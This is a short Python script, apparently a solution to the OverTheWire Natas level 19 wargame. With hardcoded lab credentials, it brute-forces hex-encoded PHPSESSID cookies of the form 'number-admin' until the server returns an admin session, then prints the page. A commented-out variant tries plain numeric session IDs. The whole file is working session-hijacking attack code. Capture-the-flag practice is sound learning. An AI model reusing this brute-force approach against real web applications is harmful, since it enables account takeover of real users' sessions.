import requests
import re
from string import *
import time
import sys
import codecs

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"


logar = ["natas19","4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"]
url = "http://%s.natas.labs.overthewire.org/"%logar[0]
session = requests.Session()

for numero in range(0,600):
    numero = str(numero)+"-"
    print("Tentando com ==> "+numero)
    encodar = codecs.getencoder("hex")
    ala = encodar(numero.encode())[0]
    PHPSESSID = str(ala).strip("'")[2:]
    adminu = str(encodar("admin".encode())).strip("'")[2:].split()[0].strip("'").strip(",").strip("'")
    print("PHPSESSID : "+PHPSESSID+adminu)
    r = session.post(url ,data={'username':'admin', 'password': 'aloha'}, auth=(logar[0],logar[1]), cookies={"PHPSESSID":PHPSESSID+adminu}, timeout=10)
    contento = r.text
    if "You are logged in as a regular user" not in contento:
        print("GOT IT")
        print(contento)
        time.sleep(15)
        print("Continuando")









"""for session_id in range(1,641):
    r = session.post(url, cookies={"PHPSESSID": str(session_id) }, data={'username':'aloha', 'password': 'aloha'}, auth=(logar[0],logar[1]), timeout=10)
    contento = r.text

    print(session.cookies)
    if "regular user" not in contento:
        print("ADMIN")
        print(contento)
        sys.exit()
    else:
        print("Tentando => "+str(session_id))
"""
